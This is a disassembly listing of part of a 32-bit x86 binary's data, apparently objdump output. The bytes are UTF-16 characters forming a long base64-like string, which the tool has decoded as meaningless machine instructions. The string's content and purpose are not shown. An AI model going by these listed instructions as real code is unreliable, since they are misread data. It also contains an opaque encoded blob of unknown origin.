  40a6ad:	00 64 00 37          	add    %ah,0x37(%eax,%eax,1)
  40a6b1:	00 61 00             	add    %ah,0x0(%ecx)
  40a6b4:	31 00                	xor    %eax,(%eax)
  40a6b6:	42                   	inc    %edx
  40a6b7:	00 4f 00             	add    %cl,0x0(%edi)
  40a6ba:	39 00                	cmp    %eax,(%eax)
  40a6bc:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40a6c0:	70 00                	jo     0x40a6c2
  40a6c2:	55                   	push   %ebp
  40a6c3:	00 38                	add    %bh,(%eax)
  40a6c5:	00 67 00             	add    %ah,0x0(%edi)
  40a6c8:	67 00 6b 00          	add    %ch,0x0(%bp,%di)
  40a6cc:	74 00                	je     0x40a6ce
  40a6ce:	69 00 38 00 77 00    	imul   $0x770038,(%eax),%eax
  40a6d4:	75 00                	jne    0x40a6d6
  40a6d6:	79 00                	jns    0x40a6d8
  40a6d8:	38 00                	cmp    %al,(%eax)
  40a6da:	56                   	push   %esi
  40a6db:	00 38                	add    %bh,(%eax)
  40a6dd:	00 6e 00             	add    %ch,0x0(%esi)
  40a6e0:	4c                   	dec    %esp
  40a6e1:	00 41 00             	add    %al,0x0(%ecx)
  40a6e4:	35 00 4a 00 46       	xor    $0x46004a00,%eax
  40a6e9:	00 59 00             	add    %bl,0x0(%ecx)
  40a6ec:	61                   	popa
  40a6ed:	00 4c 00 4f          	add    %cl,0x4f(%eax,%eax,1)
  40a6f1:	00 5a 00             	add    %bl,0x0(%edx)
  40a6f4:	30 00                	xor    %al,(%eax)
  40a6f6:	58                   	pop    %eax
  40a6f7:	00 66 00             	add    %ah,0x0(%esi)
  40a6fa:	72 00                	jb     0x40a6fc
  40a6fc:	7a 00                	jp     0x40a6fe
  40a6fe:	41                   	inc    %ecx
  40a6ff:	00 6d 00             	add    %ch,0x0(%ebp)
  40a702:	37                   	aaa
  40a703:	00 74 00 37          	add    %dh,0x37(%eax,%eax,1)
  40a707:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a70a:	35 00 37 00 46       	xor    $0x46003700,%eax
  40a70f:	00 2f                	add    %ch,(%edi)
  40a711:	00 65 00             	add    %ah,0x0(%ebp)
  40a714:	4a                   	dec    %edx
  40a715:	00 6e 00             	add    %ch,0x0(%esi)
  40a718:	58                   	pop    %eax
  40a719:	00 53 00             	add    %dl,0x0(%ebx)
  40a71c:	38 00                	cmp    %al,(%eax)
  40a71e:	2f                   	das
  40a71f:	00 72 00             	add    %dh,0x0(%edx)
  40a722:	57                   	push   %edi
  40a723:	00 4c 00 54          	add    %cl,0x54(%eax,%eax,1)
  40a727:	00 79 00             	add    %bh,0x0(%ecx)
  40a72a:	31 00                	xor    %eax,(%eax)
  40a72c:	73 00                	jae    0x40a72e
  40a72e:	79 00                	jns    0x40a730
  40a730:	2f                   	das
  40a731:	00 39                	add    %bh,(%ecx)
  40a733:	00 63 00             	add    %ah,0x0(%ebx)
  40a736:	6a 00                	push   $0x0
  40a738:	35 00 31 00 55       	xor    $0x55003100,%eax
  40a73d:	00 6f 00             	add    %ch,0x0(%edi)
  40a740:	73 00                	jae    0x40a742
  40a742:	37                   	aaa
  40a743:	00 72 00             	add    %dh,0x0(%edx)
  40a746:	69 00 50 00 53 00    	imul   $0x530050,(%eax),%eax
  40a74c:	31 00                	xor    %eax,(%eax)
  40a74e:	79 00                	jns    0x40a750
  40a750:	4a                   	dec    %edx
  40a751:	00 55 00             	add    %dl,0x0(%ebp)
  40a754:	32 00                	xor    (%eax),%al
  40a756:	34 00                	xor    $0x0,%al
  40a758:	77 00                	ja     0x40a75a
  40a75a:	6a 00                	push   $0x0
  40a75c:	6f                   	outsl  %ds:(%esi),(%dx)
  40a75d:	00 42 00             	add    %al,0x0(%edx)
  40a760:	4a                   	dec    %edx
  40a761:	00 2b                	add    %ch,(%ebx)
  40a763:	00 33                	add    %dh,(%ebx)
  40a765:	00 6e 00             	add    %ch,0x0(%esi)
  40a768:	67 00 67 00          	add    %ah,0x0(%bx)
  40a76c:	64 00 4b 00          	add    %cl,%fs:0x0(%ebx)
  40a770:	6c                   	insb   (%dx),%es:(%edi)
  40a771:	00 6f 00             	add    %ch,0x0(%edi)
  40a774:	48                   	dec    %eax
  40a775:	00 79 00             	add    %bh,0x0(%ecx)
  40a778:	79 00                	jns    0x40a77a
  40a77a:	77 00                	ja     0x40a77c
  40a77c:	63 00                	arpl   %eax,(%eax)
  40a77e:	41                   	inc    %ecx
  40a77f:	00 54 00 64          	add    %dl,0x64(%eax,%eax,1)
  40a783:	00 4c 00 78          	add    %cl,0x78(%eax,%eax,1)
  40a787:	00 77 00             	add    %dh,0x0(%edi)
  40a78a:	55                   	push   %ebp
  40a78b:	00 56 00             	add    %dl,0x0(%esi)
  40a78e:	6f                   	outsl  %ds:(%esi),(%dx)
  40a78f:	00 7a 00             	add    %bh,0x0(%edx)
  40a792:	67 00 76 00          	add    %dh,0x0(%bp)
  40a796:	41                   	inc    %ecx
  40a797:	00 43 00             	add    %al,0x0(%ebx)
  40a79a:	31 00                	xor    %eax,(%eax)
  40a79c:	73 00                	jae    0x40a79e
  40a79e:	36 00 67 00          	add    %ah,%ss:0x0(%edi)
  40a7a2:	6b 00 51             	imul   $0x51,(%eax),%eax
  40a7a5:	00 30                	add    %dh,(%eax)
  40a7a7:	00 43 00             	add    %al,0x0(%ebx)
  40a7aa:	46                   	inc    %esi
  40a7ab:	00 6c 00 55          	add    %ch,0x55(%eax,%eax,1)
  40a7af:	00 6f 00             	add    %ch,0x0(%edi)
  40a7b2:	4a                   	dec    %edx
  40a7b3:	00 67 00             	add    %ah,0x0(%edi)
  40a7b6:	4c                   	dec    %esp
  40a7b7:	00 63 00             	add    %ah,0x0(%ebx)
  40a7ba:	74 00                	je     0x40a7bc
  40a7bc:	6a 00                	push   $0x0
  40a7be:	4c                   	dec    %esp
  40a7bf:	00 63 00             	add    %ah,0x0(%ebx)
  40a7c2:	69 00 6f 00 70 00    	imul   $0x70006f,(%eax),%eax
  40a7c8:	72 00                	jb     0x40a7ca
  40a7ca:	2b 00                	sub    (%eax),%eax
  40a7cc:	53                   	push   %ebx
  40a7cd:	00 42 00             	add    %al,0x0(%edx)
  40a7d0:	6b 00 6e             	imul   $0x6e,(%eax),%eax
  40a7d3:	00 37                	add    %dh,(%edi)
  40a7d5:	00 39                	add    %bh,(%ecx)
  40a7d7:	00 78 00             	add    %bh,0x0(%eax)
  40a7da:	4f                   	dec    %edi
  40a7db:	00 70 00             	add    %dh,0x0(%eax)
  40a7de:	33 00                	xor    (%eax),%eax
  40a7e0:	37                   	aaa
  40a7e1:	00 32                	add    %dh,(%edx)
  40a7e3:	00 58 00             	add    %bl,0x0(%eax)
  40a7e6:	35 00 37 00 4c       	xor    $0x4c003700,%eax
  40a7eb:	00 6b 00             	add    %ch,0x0(%ebx)
  40a7ee:	34 00                	xor    $0x0,%al
  40a7f0:	55                   	push   %ebp
  40a7f1:	00 76 00             	add    %dh,0x0(%esi)
  40a7f4:	54                   	push   %esp
  40a7f5:	00 4f 00             	add    %cl,0x0(%edi)
  40a7f8:	46                   	inc    %esi
  40a7f9:	00 57 00             	add    %dl,0x0(%edi)
  40a7fc:	61                   	popa
  40a7fd:	00 76 00             	add    %dh,0x0(%esi)
  40a800:	72 00                	jb     0x40a802
  40a802:	56                   	push   %esi
  40a803:	00 73 00             	add    %dh,0x0(%ebx)
  40a806:	68 00 49 00 47       	push   $0x47004900
  40a80b:	00 59 00             	add    %bl,0x0(%ecx)
  40a80e:	44                   	inc    %esp
  40a80f:	00 32                	add    %dh,(%edx)
  40a811:	00 64 00 74          	add    %ah,0x74(%eax,%eax,1)
  40a815:	00 6c 00 76          	add    %ch,0x76(%eax,%eax,1)
  40a819:	00 46 00             	add    %al,0x0(%esi)
  40a81c:	75 00                	jne    0x40a81e
  40a81e:	4d                   	dec    %ebp
  40a81f:	00 42 00             	add    %al,0x0(%edx)
  40a822:	6e                   	outsb  %ds:(%esi),(%dx)
  40a823:	00 46 00             	add    %al,0x0(%esi)
  40a826:	5a                   	pop    %edx
  40a827:	00 75 00             	add    %dh,0x0(%ebp)
  40a82a:	4c                   	dec    %esp
  40a82b:	00 4d 00             	add    %cl,0x0(%ebp)
  40a82e:	33 00                	xor    (%eax),%eax
  40a830:	76 00                	jbe    0x40a832
  40a832:	6f                   	outsl  %ds:(%esi),(%dx)
  40a833:	00 33                	add    %dh,(%ebx)
  40a835:	00 4d 00             	add    %cl,0x0(%ebp)
  40a838:	35 00 47 00 77       	xor    $0x77004700,%eax
  40a83d:	00 58 00             	add    %bl,0x0(%eax)
  40a840:	6b 00 62             	imul   $0x62,(%eax),%eax
  40a843:	00 59 00             	add    %bl,0x0(%ecx)
  40a846:	38 00                	cmp    %al,(%eax)
  40a848:	56                   	push   %esi
  40a849:	00 36                	add    %dh,(%esi)
  40a84b:	00 46 00             	add    %al,0x0(%esi)
  40a84e:	30 00                	xor    %al,(%eax)
  40a850:	2f                   	das
  40a851:	00 71 00             	add    %dh,0x0(%ecx)
  40a854:	43                   	inc    %ebx
  40a855:	00 56 00             	add    %dl,0x0(%esi)
  40a858:	6f                   	outsl  %ds:(%esi),(%dx)
  40a859:	00 35 00 45 00 58    	add    %dh,0x58004500
  40a85f:	00 49 00             	add    %cl,0x0(%ecx)
  40a862:	6b 00 37             	imul   $0x37,(%eax),%eax
  40a865:	00 4e 00             	add    %cl,0x0(%esi)
  40a868:	68 00 30 00 53       	push   $0x53003000
  40a86d:	00 76 00             	add    %dh,0x0(%esi)
  40a870:	79 00                	jns    0x40a872
  40a872:	53                   	push   %ebx
  40a873:	00 4b 00             	add    %cl,0x0(%ebx)
  40a876:	66 00 30             	data16 add %dh,(%eax)
  40a879:	00 69 00             	add    %ch,0x0(%ecx)
  40a87c:	38 00                	cmp    %al,(%eax)
  40a87e:	70 00                	jo     0x40a880
  40a880:	6d                   	insl   (%dx),%es:(%edi)
  40a881:	00 4b 00             	add    %cl,0x0(%ebx)
  40a884:	30 00                	xor    %al,(%eax)
  40a886:	31 00                	xor    %eax,(%eax)
  40a888:	46                   	inc    %esi
  40a889:	00 4a 00             	add    %cl,0x0(%edx)
  40a88c:	6b 00 4a             	imul   $0x4a,(%eax),%eax
  40a88f:	00 42 00             	add    %al,0x0(%edx)
  40a892:	64 00 6c 00 31       	add    %ch,%fs:0x31(%eax,%eax,1)
  40a897:	00 4b 00             	add    %cl,0x0(%ebx)
  40a89a:	4a                   	dec    %edx
  40a89b:	00 42 00             	add    %al,0x0(%edx)
  40a89e:	6d                   	insl   (%dx),%es:(%edi)
  40a89f:	00 52 00             	add    %dl,0x0(%edx)
  40a8a2:	7a 00                	jp     0x40a8a4
  40a8a4:	33 00                	xor    (%eax),%eax
  40a8a6:	7a 00                	jp     0x40a8a8
  40a8a8:	6e                   	outsb  %ds:(%esi),(%dx)
  40a8a9:	00 66 00             	add    %ah,0x0(%esi)
  40a8ac:	37                   	aaa
  40a8ad:	00 47 00             	add    %al,0x0(%edi)
  40a8b0:	53                   	push   %ebx
  40a8b1:	00 49 00             	add    %cl,0x0(%ecx)
  40a8b4:	4a                   	dec    %edx
  40a8b5:	00 73 00             	add    %dh,0x0(%ebx)
  40a8b8:	4f                   	dec    %edi
  40a8b9:	00 66 00             	add    %ah,0x0(%esi)
  40a8bc:	6b 00 57             	imul   $0x57,(%eax),%eax
  40a8bf:	00 5a 00             	add    %bl,0x0(%edx)
  40a8c2:	55                   	push   %ebp
  40a8c3:	00 36                	add    %dh,(%esi)
  40a8c5:	00 41 00             	add    %al,0x0(%ecx)
  40a8c8:	4b                   	dec    %ebx
  40a8c9:	00 68 00             	add    %ch,0x0(%eax)
  40a8cc:	4f                   	dec    %edi
  40a8cd:	00 67 00             	add    %ah,0x0(%edi)
  40a8d0:	7a 00                	jp     0x40a8d2
  40a8d2:	4b                   	dec    %ebx
  40a8d3:	00 5a 00             	add    %bl,0x0(%edx)
  40a8d6:	70 00                	jo     0x40a8d8
  40a8d8:	6a 00                	push   $0x0
  40a8da:	46                   	inc    %esi
  40a8db:	00 76 00             	add    %dh,0x0(%esi)
  40a8de:	6b 00 6f             	imul   $0x6f,(%eax),%eax
  40a8e1:	00 42 00             	add    %al,0x0(%edx)
  40a8e4:	4a                   	dec    %edx
  40a8e5:	00 31                	add    %dh,(%ecx)
  40a8e7:	00 59 00             	add    %bl,0x0(%ecx)
  40a8ea:	2f                   	das
  40a8eb:	00 52 00             	add    %dl,0x0(%edx)
  40a8ee:	4f                   	dec    %edi
  40a8ef:	00 75 00             	add    %dh,0x0(%ebp)
  40a8f2:	57                   	push   %edi
  40a8f3:	00 54 00 4d          	add    %dl,0x4d(%eax,%eax,1)
  40a8f7:	00 38                	add    %bh,(%eax)
  40a8f9:	00 67 00             	add    %ah,0x0(%edi)
  40a8fc:	62 00                	bound  %eax,(%eax)
  40a8fe:	49                   	dec    %ecx
  40a8ff:	00 53 00             	add    %dl,0x0(%ebx)
  40a902:	77 00                	ja     0x40a904
  40a904:	2b 00                	sub    (%eax),%eax
  40a906:	7a 00                	jp     0x40a908
  40a908:	66 00 50 00          	data16 add %dl,0x0(%eax)
  40a90c:	68 00 69 00 36       	push   $0x36006900
  40a911:	00 55 00             	add    %dl,0x0(%ebp)
  40a914:	41                   	inc    %ecx
  40a915:	00 79 00             	add    %bh,0x0(%ecx)
  40a918:	67 00 51 00          	add    %dl,0x0(%bx,%di)
  40a91c:	33 00                	xor    (%eax),%eax
  40a91e:	77 00                	ja     0x40a920
  40a920:	75 00                	jne    0x40a922
  40a922:	67 00 6d 00          	add    %ch,0x0(%di)
  40a926:	52                   	push   %edx
  40a927:	00 36                	add    %dh,(%esi)
  40a929:	00 4c 00 43          	add    %cl,0x43(%eax,%eax,1)
  40a92d:	00 74 00 4d          	add    %dh,0x4d(%eax,%eax,1)
  40a931:	00 68 00             	add    %ch,0x0(%eax)
  40a934:	33 00                	xor    (%eax),%eax
  40a936:	4a                   	dec    %edx
  40a937:	00 4f 00             	add    %cl,0x0(%edi)
  40a93a:	75 00                	jne    0x40a93c
  40a93c:	36 00 4a 00          	add    %cl,%ss:0x0(%edx)
  40a940:	32 00                	xor    (%eax),%al
  40a942:	70 00                	jo     0x40a944
  40a944:	5a                   	pop    %edx
  40a945:	00 2f                	add    %ch,(%edi)
  40a947:	00 6e 00             	add    %ch,0x0(%esi)
  40a94a:	56                   	push   %esi
  40a94b:	00 58 00             	add    %bl,0x0(%eax)
  40a94e:	54                   	push   %esp
  40a94f:	00 73 00             	add    %dh,0x0(%ebx)
  40a952:	72 00                	jb     0x40a954
  40a954:	64 00 2b             	add    %ch,%fs:(%ebx)
  40a957:	00 49 00             	add    %cl,0x0(%ecx)
  40a95a:	77 00                	ja     0x40a95c
  40a95c:	74 00                	je     0x40a95e
  40a95e:	42                   	inc    %edx
  40a95f:	00 64 00 63          	add    %ah,0x63(%eax,%eax,1)
  40a963:	00 7a 00             	add    %bh,0x0(%edx)
  40a966:	35 00 75 00 30       	xor    $0x30007500,%eax
  40a96b:	00 36                	add    %dh,(%esi)
  40a96d:	00 42 00             	add    %al,0x0(%edx)
  40a970:	43                   	inc    %ebx
  40a971:	00 4a 00             	add    %cl,0x0(%edx)
  40a974:	4b                   	dec    %ebx
  40a975:	00 42 00             	add    %al,0x0(%edx)
  40a978:	31 00                	xor    %eax,(%eax)
  40a97a:	31 00                	xor    %eax,(%eax)
  40a97c:	4c                   	dec    %esp
  40a97d:	00 4b 00             	add    %cl,0x0(%ebx)
  40a980:	44                   	inc    %esp
  40a981:	00 6b 00             	add    %ch,0x0(%ebx)
  40a984:	4f                   	dec    %edi
  40a985:	00 32                	add    %dh,(%edx)
  40a987:	00 6b 00             	add    %ch,0x0(%ebx)
  40a98a:	78 00                	js     0x40a98c
  40a98c:	49                   	dec    %ecx
  40a98d:	00 39                	add    %bh,(%ecx)
  40a98f:	00 6b 00             	add    %ch,0x0(%ebx)
  40a992:	42                   	inc    %edx
  40a993:	00 6c 00 62          	add    %ch,0x62(%eax,%eax,1)
  40a997:	00 43 00             	add    %al,0x0(%ebx)
  40a99a:	54                   	push   %esp
  40a99b:	00 33                	add    %dh,(%ebx)
  40a99d:	00 62 00             	add    %ah,0x0(%edx)
  40a9a0:	46                   	inc    %esi
  40a9a1:	00 37                	add    %dh,(%edi)
  40a9a3:	00 59 00             	add    %bl,0x0(%ecx)
  40a9a6:	32 00                	xor    (%eax),%al
  40a9a8:	65 00 75 00          	add    %dh,%gs:0x0(%ebp)
  40a9ac:	4c                   	dec    %esp
  40a9ad:	00 66 00             	add    %ah,0x0(%esi)
  40a9b0:	63 00                	arpl   %eax,(%eax)
  40a9b2:	54                   	push   %esp
  40a9b3:	00 68 00             	add    %ch,0x0(%eax)
  40a9b6:	2b 00                	sub    (%eax),%eax
  40a9b8:	4e                   	dec    %esi
  40a9b9:	00 31                	add    %dh,(%ecx)
  40a9bb:	00 41 00             	add    %al,0x0(%ecx)
  40a9be:	41                   	inc    %ecx
  40a9bf:	00 72 00             	add    %dh,0x0(%edx)
  40a9c2:	4a                   	dec    %edx
  40a9c3:	00 2f                	add    %ch,(%edi)
  40a9c5:	00 7a 00             	add    %bh,0x0(%edx)
  40a9c8:	64 00 48 00          	add    %cl,%fs:0x0(%eax)
  40a9cc:	49                   	dec    %ecx
  40a9cd:	00 33                	add    %dh,(%ebx)
  40a9cf:	00 57 00             	add    %dl,0x0(%edi)
  40a9d2:	71 00                	jno    0x40a9d4
  40a9d4:	6f                   	outsl  %ds:(%esi),(%dx)
  40a9d5:	00 51 00             	add    %dl,0x0(%ecx)
  40a9d8:	79 00                	jns    0x40a9da
  40a9da:	38 00                	cmp    %al,(%eax)
  40a9dc:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  40a9e0:	65 00 64 00 70       	add    %ah,%gs:0x70(%eax,%eax,1)
  40a9e5:	00 52 00             	add    %dl,0x0(%edx)
  40a9e8:	6a 00                	push   $0x0
  40a9ea:	31 00                	xor    %eax,(%eax)
  40a9ec:	73 00                	jae    0x40a9ee
  40a9ee:	77 00                	ja     0x40a9f0
  40a9f0:	32 00                	xor    (%eax),%al
  40a9f2:	53                   	push   %ebx
  40a9f3:	00 72 00             	add    %dh,0x0(%edx)
  40a9f6:	43                   	inc    %ebx
  40a9f7:	00 50 00             	add    %dl,0x0(%eax)
  40a9fa:	5a                   	pop    %edx
  40a9fb:	00 58 00             	add    %bl,0x0(%eax)
  40a9fe:	68 00 36 00 57       	push   $0x57003600
  40aa03:	00 5a 00             	add    %bl,0x0(%edx)
  40aa06:	62 00                	bound  %eax,(%eax)
  40aa08:	74 00                	je     0x40aa0a
  40aa0a:	58                   	pop    %eax
  40aa0b:	00 4d 00             	add    %cl,0x0(%ebp)
  40aa0e:	4a                   	dec    %edx
  40aa0f:	00 6b 00             	add    %ch,0x0(%ebx)
  40aa12:	57                   	push   %edi
  40aa13:	00 4a 00             	add    %cl,0x0(%edx)
  40aa16:	41                   	inc    %ecx
  40aa17:	00 49 00             	add    %cl,0x0(%ecx)
  40aa1a:	58                   	pop    %eax
  40aa1b:	00 5a 00             	add    %bl,0x0(%edx)
  40aa1e:	7a 00                	jp     0x40aa20
  40aa20:	75 00                	jne    0x40aa22
  40aa22:	43                   	inc    %ebx
  40aa23:	00 36                	add    %dh,(%esi)
  40aa25:	00 31                	add    %dh,(%ecx)
  40aa27:	00 68 00             	add    %ch,0x0(%eax)
  40aa2a:	6b 00 79             	imul   $0x79,(%eax),%eax
  40aa2d:	00 55 00             	add    %dl,0x0(%ebp)
  40aa30:	71 00                	jno    0x40aa32
  40aa32:	31 00                	xor    %eax,(%eax)
  40aa34:	2b 00                	sub    (%eax),%eax
  40aa36:	78 00                	js     0x40aa38
  40aa38:	5a                   	pop    %edx
  40aa39:	00 35 00 46 00 70    	add    %dh,0x70004600
  40aa3f:	00 68 00             	add    %ch,0x0(%eax)
  40aa42:	45                   	inc    %ebp
  40aa43:	00 79 00             	add    %bh,0x0(%ecx)
  40aa46:	30 00                	xor    %al,(%eax)
  40aa48:	36 00 68 00          	add    %ch,%ss:0x0(%eax)
  40aa4c:	31 00                	xor    %eax,(%eax)
  40aa4e:	59                   	pop    %ecx
  40aa4f:	00 6c 00 6d          	add    %ch,0x6d(%eax,%eax,1)
  40aa53:	00 45 00             	add    %al,0x0(%ebp)
  40aa56:	4a                   	dec    %edx
  40aa57:	00 32                	add    %dh,(%edx)
  40aa59:	00 77 00             	add    %dh,0x0(%edi)
  40aa5c:	55                   	push   %ebp
  40aa5d:	00 54 00 54          	add    %dl,0x54(%eax,%eax,1)
  40aa61:	00 6e 00             	add    %ch,0x0(%esi)
  40aa64:	45                   	inc    %ebp
  40aa65:	00 2b                	add    %ch,(%ebx)
  40aa67:	00 31                	add    %dh,(%ecx)
  40aa69:	00 58 00             	add    %bl,0x0(%eax)
  40aa6c:	47                   	inc    %edi
  40aa6d:	00 43 00             	add    %al,0x0(%ebx)
  40aa70:	74 00                	je     0x40aa72
  40aa72:	2f                   	das
  40aa73:	00 46 00             	add    %al,0x0(%esi)
  40aa76:	70 00                	jo     0x40aa78
  40aa78:	48                   	dec    %eax
  40aa79:	00 75 00             	add    %dh,0x0(%ebp)
  40aa7c:	73 00                	jae    0x40aa7e
  40aa7e:	68 00 49 00 79       	push   $0x79004900
  40aa83:	00 53 00             	add    %dl,0x0(%ebx)
  40aa86:	38 00                	cmp    %al,(%eax)
  40aa88:	38 00                	cmp    %al,(%eax)
  40aa8a:	70 00                	jo     0x40aa8c
  40aa8c:	56                   	push   %esi
  40aa8d:	00 37                	add    %dh,(%edi)
  40aa8f:	00 5a 00             	add    %bl,0x0(%edx)
  40aa92:	42                   	inc    %edx
  40aa93:	00 43 00             	add    %al,0x0(%ebx)
  40aa96:	48                   	dec    %eax
  40aa97:	00 47 00             	add    %al,0x0(%edi)
  40aa9a:	52                   	push   %edx
  40aa9b:	00 39                	add    %bh,(%ecx)
  40aa9d:	00 6e 00             	add    %ch,0x0(%esi)
  40aaa0:	74 00                	je     0x40aaa2
  40aaa2:	66 00 46 00          	data16 add %al,0x0(%esi)
  40aaa6:	64 00 63 00          	add    %ah,%fs:0x0(%ebx)
  40aaaa:	79 00                	jns    0x40aaac
  40aaac:	56                   	push   %esi
  40aaad:	00 73 00             	add    %dh,0x0(%ebx)
  40aab0:	6d                   	insl   (%dx),%es:(%edi)
  40aab1:	00 75 00             	add    %dh,0x0(%ebp)
  40aab4:	57                   	push   %edi
  40aab5:	00 47 00             	add    %al,0x0(%edi)
  40aab8:	64 00 6e 00          	add    %ch,%fs:0x0(%esi)
  40aabc:	48                   	dec    %eax
  40aabd:	00 78 00             	add    %bh,0x0(%eax)
  40aac0:	54                   	push   %esp
  40aac1:	00 54 00 32          	add    %dl,0x32(%eax,%eax,1)
  40aac5:	00 6b 00             	add    %ch,0x0(%ebx)
  40aac8:	2b 00                	sub    (%eax),%eax
  40aaca:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40aace:	6f                   	outsl  %ds:(%esi),(%dx)
  40aacf:	00 4e 00             	add    %cl,0x0(%esi)
  40aad2:	64 00 75 00          	add    %dh,%fs:0x0(%ebp)
  40aad6:	79 00                	jns    0x40aad8
  40aad8:	30 00                	xor    %al,(%eax)
  40aada:	72 00                	jb     0x40aadc
  40aadc:	33 00                	xor    (%eax),%eax
  40aade:	31 00                	xor    %eax,(%eax)
  40aae0:	45                   	inc    %ebp
  40aae1:	00 77 00             	add    %dh,0x0(%edi)
  40aae4:	47                   	inc    %edi
  40aae5:	00 58 00             	add    %bl,0x0(%eax)
  40aae8:	32 00                	xor    (%eax),%al
  40aaea:	41                   	inc    %ecx
  40aaeb:	00 44 00 61          	add    %al,0x61(%eax,%eax,1)
  40aaef:	00 57 00             	add    %dl,0x0(%edi)
  40aaf2:	6f                   	outsl  %ds:(%esi),(%dx)
  40aaf3:	00 78 00             	add    %bh,0x0(%eax)
  40aaf6:	63 00                	arpl   %eax,(%eax)
  40aaf8:	38 00                	cmp    %al,(%eax)
  40aafa:	6f                   	outsl  %ds:(%esi),(%dx)
  40aafb:	00 4c 00 34          	add    %cl,0x34(%eax,%eax,1)
  40aaff:	00 67 00             	add    %ah,0x0(%edi)
  40ab02:	41                   	inc    %ecx
  40ab03:	00 39                	add    %bh,(%ecx)
  40ab05:	00 73 00             	add    %dh,0x0(%ebx)
  40ab08:	70 00                	jo     0x40ab0a
  40ab0a:	5a                   	pop    %edx
  40ab0b:	00 57 00             	add    %dl,0x0(%edi)
  40ab0e:	75 00                	jne    0x40ab10
  40ab10:	78 00                	js     0x40ab12
  40ab12:	7a 00                	jp     0x40ab14
  40ab14:	52                   	push   %edx
  40ab15:	00 2b                	add    %ch,(%ebx)
  40ab17:	00 38                	add    %bh,(%eax)
  40ab19:	00 38                	add    %bh,(%eax)
  40ab1b:	00 6a 00             	add    %ch,0x0(%edx)
  40ab1e:	72 00                	jb     0x40ab20
  40ab20:	5a                   	pop    %edx
  40ab21:	00 57 00             	add    %dl,0x0(%edi)
  40ab24:	32 00                	xor    (%eax),%al
  40ab26:	41                   	inc    %ecx
  40ab27:	00 66 00             	add    %ah,0x0(%esi)
  40ab2a:	59                   	pop    %ecx
  40ab2b:	00 45 00             	add    %al,0x0(%ebp)
  40ab2e:	7a 00                	jp     0x40ab30
  40ab30:	4e                   	dec    %esi
  40ab31:	00 33                	add    %dh,(%ebx)
  40ab33:	00 45 00             	add    %al,0x0(%ebp)
  40ab36:	32 00                	xor    (%eax),%al
  40ab38:	4f                   	dec    %edi
  40ab39:	00 45 00             	add    %al,0x0(%ebp)
  40ab3c:	6b 00 30             	imul   $0x30,(%eax),%eax
  40ab3f:	00 55 00             	add    %dl,0x0(%ebp)
  40ab42:	69 00 39 00 73 00    	imul   $0x730039,(%eax),%eax
  40ab48:	4d                   	dec    %ebp
  40ab49:	00 6e 00             	add    %ch,0x0(%esi)
  40ab4c:	65 00 59 00          	add    %bl,%gs:0x0(%ecx)
  40ab50:	78 00                	js     0x40ab52
  40ab52:	33 00                	xor    (%eax),%eax
  40ab54:	52                   	push   %edx
  40ab55:	00 32                	add    %dh,(%edx)
  40ab57:	00 68 00             	add    %ch,0x0(%eax)
  40ab5a:	38 00                	cmp    %al,(%eax)
  40ab5c:	5a                   	pop    %edx
  40ab5d:	00 58 00             	add    %bl,0x0(%eax)
  40ab60:	2b 00                	sub    (%eax),%eax
  40ab62:	33 00                	xor    (%eax),%eax
  40ab64:	63 00                	arpl   %eax,(%eax)
  40ab66:	6c                   	insb   (%dx),%es:(%edi)
  40ab67:	00 63 00             	add    %ah,0x0(%ebx)
  40ab6a:	6f                   	outsl  %ds:(%esi),(%dx)
  40ab6b:	00 46 00             	add    %al,0x0(%esi)
  40ab6e:	75 00                	jne    0x40ab70
  40ab70:	46                   	inc    %esi
  40ab71:	00 69 00             	add    %ch,0x0(%ecx)
  40ab74:	65 00 66 00          	add    %ah,%gs:0x0(%esi)
  40ab78:	4e                   	dec    %esi
  40ab79:	00 4b 00             	add    %cl,0x0(%ebx)
  40ab7c:	54                   	push   %esp
  40ab7d:	00 6f 00             	add    %ch,0x0(%edi)
  40ab80:	2f                   	das
  40ab81:	00 78 00             	add    %bh,0x0(%eax)
  40ab84:	74 00                	je     0x40ab86
  40ab86:	57                   	push   %edi
  40ab87:	00 53 00             	add    %dl,0x0(%ebx)
  40ab8a:	41                   	inc    %ecx
  40ab8b:	00 39                	add    %bh,(%ecx)
  40ab8d:	00 72 00             	add    %dh,0x0(%edx)
  40ab90:	39 00                	cmp    %eax,(%eax)
  40ab92:	66 00 54 00 48       	data16 add %dl,0x48(%eax,%eax,1)
  40ab97:	00 42 00             	add    %al,0x0(%edx)
  40ab9a:	4d                   	dec    %ebp
  40ab9b:	00 65 00             	add    %ah,0x0(%ebp)
  40ab9e:	71 00                	jno    0x40aba0
  40aba0:	30 00                	xor    %al,(%eax)
  40aba2:	4a                   	dec    %edx
  40aba3:	00 35 00 6e 00 6e    	add    %dh,0x6e006e00
  40aba9:	00 32                	add    %dh,(%edx)
  40abab:	00 69 00             	add    %ch,0x0(%ecx)
  40abae:	48                   	dec    %eax
  40abaf:	00 2b                	add    %ch,(%ebx)
  40abb1:	00 4b 00             	add    %cl,0x0(%ebx)
  40abb4:	58                   	pop    %eax
  40abb5:	00 51 00             	add    %dl,0x0(%ecx)
  40abb8:	62 00                	bound  %eax,(%eax)
  40abba:	78 00                	js     0x40abbc
  40abbc:	45                   	inc    %ebp
  40abbd:	00 61 00             	add    %ah,0x0(%ecx)
  40abc0:	49                   	dec    %ecx
  40abc1:	00 54 00 72          	add    %dl,0x72(%eax,%eax,1)
  40abc5:	00 36                	add    %dh,(%esi)
  40abc7:	00 71 00             	add    %dh,0x0(%ecx)
  40abca:	63 00                	arpl   %eax,(%eax)
  40abcc:	79 00                	jns    0x40abce
  40abce:	54                   	push   %esp
  40abcf:	00 6f 00             	add    %ch,0x0(%edi)
  40abd2:	50                   	push   %eax
  40abd3:	00 58 00             	add    %bl,0x0(%eax)
  40abd6:	77 00                	ja     0x40abd8
  40abd8:	72 00                	jb     0x40abda
  40abda:	6b 00 4e             	imul   $0x4e,(%eax),%eax
  40abdd:	00 69 00             	add    %ch,0x0(%ecx)
  40abe0:	42                   	inc    %edx
  40abe1:	00 6e 00             	add    %ch,0x0(%esi)
  40abe4:	66 00 74 00 32       	data16 add %dh,0x32(%eax,%eax,1)
  40abe9:	00 45 00             	add    %al,0x0(%ebp)
  40abec:	34 00                	xor    $0x0,%al
  40abee:	69 00 4a 00 31 00    	imul   $0x31004a,(%eax),%eax
  40abf4:	77 00                	ja     0x40abf6
  40abf6:	62 00                	bound  %eax,(%eax)
